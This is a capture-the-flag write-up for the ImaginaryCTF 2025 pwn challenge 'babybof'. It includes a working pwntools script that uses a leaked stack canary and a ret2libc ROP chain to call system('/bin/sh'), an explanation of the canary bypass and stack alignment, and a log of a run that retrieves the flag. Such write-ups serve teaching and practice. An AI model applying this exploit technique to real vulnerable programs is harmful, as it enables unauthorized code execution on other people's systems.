---
author: cirno
title: "ImaginaryCTF 2025 / Pwn / babybof"
description: "welcome to pwn! hopefully you can do your first buffer overflow"
pubDate: "Sep 12 2025"
heroImage: "/writeups/cirno.png"
---

## Checksec
```bash
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   ./vuln
```

## Solution

```python
from pwn import *

p = process('./vuln')
#p = remote('babybof.chal.imaginaryctf.org', 1337)

# Process output
text = p.recvuntil(b'!): ')
print(text.decode('ascii'))

# Create list of addresses
numbers = re.findall(r'0x[0-9a-fA-F]+', str(text))
numbers = list(map(lambda x: int(x, 16), numbers))

# Assign addresses
system_addr = p64(numbers[0])
pop_rdi_ret = p64(numbers[1])
ret_addr    = p64(numbers[2])
bin_sh_addr = p64(numbers[3])
canary      = p64(numbers[4])

# Encode payload
payload = b'A'*56
payload += canary
payload += b'A'*8
payload += pop_rdi_ret
payload += bin_sh_addr
payload += ret_addr
payload += system_addr

# Send payload
p.sendline(payload)

# Output
for i in range(3):
    print(p.recvline().decode('ascii'), end='')

# System shell
#p.sendline(b'cat flag.txt')
p.interactive()
```

## Explanation

Since I haven't done any buffer overflows before, I thought this one would be a fun challenge to try out.


### Binary
Executing the binary gives the following as output:
- system() address
- rdi gadget address
- ret address (same as above but displaced by one byte)
- address for a "/bin/sh" string
- canary value

Then the program asks for an input, and says that the "stack must be aligned". This will be important later.

Sending a big enough input to the program shows that we can overwrite both the canary and the return address. Every value given is static, except the canary.

From all this information, it was pretty clear that the intended solution is a standard ret2libc attack (that I didn't yet knew how to execute), with a (leaked) canary.

When sending a bunch of A's, the program replies with the "stack smashing detected" message and aborts execution, indicating that the canary check routine failed. 
Bypassing this is as simple as rewriting the canary with the leaked value. The canary's address always corresponds to buf+56.
There is an 8 byte gap between the canary and the return address.

## Ret2libc
Reading a bit on ret2libc and ROP (thanks to chikoi for explaining!), we realize that redirecting control-flow to shellcode is not possible, since NX is enabled in this binary. 
We somehow need to execute code from libc using "ROP gadgets" - of which system("/bin/sh") is the easiest routine to get a shell from.

These gadgets are usually pieces of Assembly code that *pops* a register and returns execution. 
This makes them useful for setting up the registers before jumping to a function, which is exactly what we need.

The glibc's system() function will execute its first argument as a program - we know that the first argument is whatever is pointed at by *rdi* - so the gadget we need is "pop rdi; ret".
When used, it will get the previous value in the stack, pop it into *rdi*, then return.

### Stack alignment
Another important thing to note is that system() - as implemented by glibc - uses some instructions that expect a 16-byte alignment.
To solve this, we need to put an additional *ret* instruction before calling system() - IF the stack isn't aligned after calling the last gadget - which was the case in this problem.
This will add 8 bytes to RSP, making it aligned.

## Payload
Now, it's clear that the payload should consist of the following:
- 56 bytes
- canary
- 8 bytes
- rdi gadget
- "/bin/sh" address
- ret instruction
- system() address

Unwinding the stack will:
- pass the __stack_chk_fail() check
- pop the "/bin/sh" address into rdi
- align the stack with an additional ret
- call system("/bin/sh")

This gives us a shell, which we can use to issue commands and read the flag \\^_^/

## Solving
```
cirno$ python3 solve.py
[+] Opening connection to babybof.chal.imaginaryctf.org on port 1337: Done
== proof-of-work: disabled ==
Welcome to babybof!
Here is some helpful info:
system @ 0x7f1d4c653b00
pop rdi; ret @ 0x4011ba
ret @ 0x4011bb
"/bin/sh" @ 0x404038
canary: 0xe5fd0c42b716c400
enter your input (make sure your stack is aligned!): 
your input: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
canary: 0xe5fd0c42b716c400
return address: 0x4011ba
[*] Switching to interactive mode
ictf{arent_challenges_written_two_hours_before_ctf_amazing}
$
[*] Closed connection to babybof.chal.imaginaryctf.org port 1337
cirno$ 
```